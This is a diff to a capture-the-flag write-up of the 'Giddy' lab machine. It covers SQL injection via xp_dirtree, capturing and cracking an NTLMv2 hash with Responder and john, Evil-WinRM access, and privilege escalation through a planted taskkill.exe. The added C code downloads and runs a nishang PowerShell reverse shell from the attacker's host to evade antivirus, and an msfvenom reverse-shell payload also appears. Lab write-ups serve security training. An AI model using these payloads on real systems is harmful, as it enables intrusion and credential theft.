@@ -8,7 +8,7 @@ Target IP
 ---
 
 First lets start with [AutoRecon](https://github.com/Tib3rius/AutoRecon).
-```
+```nginx
 sudo $(which autorecon) 10.10.10.104
 ```
 
@@ -16,7 +16,7 @@ sudo $(which autorecon) 10.10.10.104
 
 On nmap we see the following ports open
 
-```
+```nginx
 PORT     STATE SERVICE       REASON          VERSION
 80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
 |_http-title: IIS Windows Server
@@ -125,7 +125,7 @@ Accessing port 80 and 443 on a browser we see only page with a photo of a dog.
 
 `forexbuster` return to us the following
 
-```
+```nginx
 200      GET      362l     2183w    88856c https://10.10.10.104/giddy.jpg
 200      GET       32l       55w      700c https://10.10.10.104/
 301      GET        2l       10w      158c https://10.10.10.104/aspnet_client => https://10.10.10.104/aspnet_client/
@@ -183,13 +183,13 @@ One of the quickest ways I found out to test if SQL Inject works and if the mach
 
 This here may do the work for us. Replace the IP with your one.
 
-```
+```SQL
 1'; use master; exec xp_dirtree '\\10.10.14.XX\SHARE';-- 
 ```
 
 1st we need to start a SMB listener on our Kali.
 
-```
+```nginx
 nc -nlvp 445 
 listening on [any] 445 ...
 ```
@@ -200,7 +200,7 @@ Then we run the following search.
 
 And I got the following result.
 
-```
+```nginx
 nc -nlvp 445 
 listening on [any] 445 ...
 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.104] 49707
@@ -211,7 +211,7 @@ We can then confirm that SQL Injection works, it is a SQL Server and it has netw
 
 Now we can user `Responder` to see if we can get a hash.
 
-```
+```nginx
 $ sudo responder -I tun0
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -288,7 +288,7 @@ Then, I ran again the `xp_dirtree` SQL Injection.
 
 And got the following on `Responder`.
 
-```
+```nginx
 ...
 [+] Listening for events...
 
@@ -300,7 +300,7 @@ And got the following on `Responder`.
 ```
 
 `Responder` logs have a file with captured hash.
-```
+```nginx
 $ ls -lha /usr/share/responder/logs 
 total 92K
 drwxr-xr-x 2 root root 4.0K Oct 25 16:58 .
@@ -312,14 +312,14 @@ drwxr-xr-x 9 root root 4.0K Oct 25 16:58 ..
 -rw-r--r-- 1 root root 2.8K Oct 25 16:58 SMB-NTLMv2-SSP-10.10.10.104.txt
 ```
 
-```
+```nginx
 $ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.104.txt 
 Stacy::GIDDY:edf1902fc598e764:54475F36C671E7C2B3D0F664B0CB651A:010100000000000080DFAEA592E8D801B276497B718E4623000000000200080039004A003900300001001E00570049004E002D00500054004F003800380049003300330046004F00410004003400570049004E002D00500054004F003800380049003300330046004F0041002E0039004A00390030002E004C004F00430041004C000300140039004A00390030002E004C004F00430041004C000500140039004A00390030002E004C004F00430041004C000700080080DFAEA592E8D80106000400020000000800300030000000000000000000000000300000034AA32441904AB0BC56F8CC94CC04C90D929D7AFB3D0FD8AA94C139304362730A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
 ```
 
 Now, lets run `john` to try to crack the hash.
 
-```
+```nginx
 $ john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.104.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
@@ -351,7 +351,7 @@ However, if we try to add the name of the computer before the user name, it work
 
 Or we can access PowerShell using `Evil-WinRM`.
 
-```
+```nginx
 $ evil-winrm -i 10.10.10.104 -u Stacy -p xNnWo6272k7x    
 
 Evil-WinRM shell v3.4
@@ -372,7 +372,7 @@ Now that we have a shell on the machine, lets dig a bit to see what we can do he
 
 Listing `Documents` folder gives us an idea on what could be running on the machine.
 
-```
+```PowerShell
 PS C:\Users\Stacy\Documents> 
 dir
 
@@ -383,7 +383,7 @@ Mode                LastWriteTime         Length Name
 ```
 Reading the `unifivideo` file shows the word `stop`.
 
-```
+```PowerShell
 cat .\unifivideo
 
 stop
@@ -391,13 +391,13 @@ stop
 
 Investigating PowerShell command history, we get more tips.
 
-```
+```PowerShell
 (Get-PSReadLineOption).HistorySavePath
 
 C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt
 ```
 
-```
+```PowerShell
 dir C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
 
     Directory: C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
@@ -407,7 +407,7 @@ Mode                LastWriteTime         Length Name
 ```
 
 
-```
+```PowerShell
 cat C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 net stop unifivideoservice
@@ -424,7 +424,7 @@ On the history we see commands related to a service called `unifivideoservice`.
 If we try to see all the servers on the target, we receive access denied.
 
 
-```
+```PowerShell
 get-service
 
 Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
@@ -432,7 +432,7 @@ Cannot open Service Control Manager on computer '.'. This operation might requir
     + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand 
 ```
 
-```
+```PowerShell
 sc.exe query
 
 [SC] OpenSCManager FAILED 5:
@@ -441,7 +441,7 @@ Access is denied.
 
 However, listing the services registry with `reg.exe QUERY`, we see a service called `UniFiVideoService`.
 
-```
+```PowerShell
 reg.exe QUERY HKLM\SYSTEM\CurrentControlSet\Services
 ...
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UmPass
@@ -452,7 +452,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\upnphost
 ...
 ```
 
-```
+```PowerShell
 reg.exe QUERY HKLM\SYSTEM\CurrentControlSet\Services\UniFiVideoService
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
@@ -469,7 +469,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
 
 If we try to get details for that specific service, we get the results. 
 
-```
+```PowerShell
 Get-Service UniFiVideoService
 
 Status   Name               DisplayName
@@ -479,7 +479,7 @@ Running  UniFiVideoService  Ubiquiti UniFi Video
 
 Now that we know details about this service, we can search for any known vulnerability.
 
-```
+```nginx
 $ searchsploit unifi video               
 ----------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                           |  Path
@@ -492,7 +492,8 @@ Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation                         
 There is a Windows Local Privilege Escalation one that may help up.
 
 Lets make a copy of the exploit file and see its details.
-```
+
+```nginx
 $ searchsploit -m windows/local/43390.txt
   Exploit: Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation
       URL: https://www.exploit-db.com/exploits/43390
@@ -535,7 +536,7 @@ Ok, now we know that if we drop a files called `taskkill.exe` on the software di
 
 Let's try to create a payload with `msfvenom` and drop the file on the specific directory.
 
-```
+```nginx
 $ msfvenom -a x64 -p windows/x64/shell_reverse_tcp _tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o taskkill.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No encoder specified, outputting raw payload
@@ -546,7 +547,7 @@ Saved as: taskkill.exe
 
 Start a SMB server.
 
-```
+```nginx
 $ impacket-smbserver share $(pwd) -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -560,7 +561,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 And try to copy the file.
 
-```
+```PowerShell
 xcopy \\10.10.14.12\share\taskkill.exe C:\ProgramData\unifi-video\
 
 \\10.10.14.12\share\taskkill.exe
@@ -573,30 +574,96 @@ The target has its antivirus running and it caught our payload.
 
 We need to find a way to bypass the antivirus.
 
+Searching on the internet I found a C code that calls PowerShell to download one of the `nishang` shell scripts and invoke it direct from memory.
 
-
-
+```C
+#include "stdlib.h"
+int main()
+{
+    system("powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 4444");
+    return 0;
+}
 ```
+
+To compile the code we can use the following.
+
+```nginx
+$ i686-w64-mingw32-gcc taskkill.c -o taskkill.exe
+```
+
+Ok, now we need to move it to the service folder on the target.
+
+```PowerShell
+*Evil-WinRM* PS C:\Users\Stacy\Documents> xcopy \\10.10.14.12\share\taskkill.exe C:\ProgramData\unifi-video\
+\\10.10.14.12\share\taskkill.exe
+1 File(s) copied
+*Evil-WinRM* PS C:\Users\Stacy\Documents> dir C:\ProgramData\unifi-video\
+
+    Directory: C:\ProgramData\unifi-video
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----       10/26/2022   2:11 PM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+-a----        7/26/2017   6:10 PM         219136 avService.exe
+-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+-a----       10/26/2022   2:26 PM         100470 taskkill.exe
+-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
+```
+
+Next, we need to start a webserver to host the `nishang` shell files.
+
+```nginx
+$ cd /opt/nishang/Shells/          
+$ sudo python -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+We will also need the listner set, to get the connection when the service stop/start.
+
+
+```nginx
 $ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
+We are ready! Now, lets stop the service and see if it works.
 
-```
-Stop-Service -Name Unifivideoservice -Force
+```PowerShell
+*Evil-WinRM* PS C:\Users\Stacy\Documents> Stop-Service -Name Unifivideoservice -Force
 
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
-WARNING: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (Unifivideoservice)' to stop...
 ...
 ```
 
+Soon after a few seconds of the service stop command, we see our webserver receiving a call.
 
-
+```nginx
+...
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.104 - - [26/Oct/2022 11:38:20] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
+
+And after that we get an elevated shell.
+
+```nginx
 $ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.104] 49821
